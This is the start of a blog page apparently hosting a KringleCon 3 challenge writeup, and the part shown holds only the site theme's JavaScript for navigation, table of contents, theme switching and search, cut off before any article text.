<!DOCTYPE html>
<html lang="en" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KringleCon 3: Three French Hens – noobintheshell :: blog</title>
    




<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>

<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>

<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var footNoteRefs = document.querySelectorAll('.footnote-ref');
    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');

    footNoteRefs ? 
    footNoteRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function () {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;

    footNoteBackRefs ? 
    footNoteBackRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function() {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("true");
    
    var tocLevels = JSON.parse("[\"h2\",\"h3\",\"h4\"]");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }

        if (navbar.classList.contains('scrolling')) {
          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('scrolling')) {
          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
    
    
    var skinDarkCode = JSON.parse("\"dark\"");
    
    var skinLightCode = JSON.parse("\"light\"");
    
    var skinHackerCode = JSON.parse("\"hacker\"");
    
    var skinSolarizedCode = JSON.parse("\"solarized\"");
    
    var skinKimbieCode = JSON.parse("\"kimbie\"");

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      }
    }

    var parseSkinCode = function(themeText) {
      if (themeText === skinDarkCode) {
        return 'dark';
      } else if (themeText === skinLightCode) {
        return 'light';
      } else if (themeText === skinHackerCode) {
        return 'hacker';
      } else if (themeText === skinSolarizedCode) {
        return 'solarized';
      } else if (themeText === skinKimbieCode) {
        return 'kimbie';
      }
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://noobintheshell.com\"");
    
    var permalink = JSON.parse("\"https://noobintheshell.com/posts/kringlecon3/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("false");
    
    var enableSearchHighlight = JSON.parse("false");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
              includeMatches: enableSearchHighlight,
              shouldSort: true, 
              threshold: 0.4, 
              location: 0, 
              distance: 100, 
              maxPatternLength: 32,
              minMatchCharLength: 1,
              isCaseSensitive: false, 
              findAllMatches: false, 
              useExtendedSearch: false, 
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.permalink);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.item.description) {
        descDiv.innerHTML = obj.item.description;
      } else if (obj.item.content) {
        descDiv.innerHTML = obj.item.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
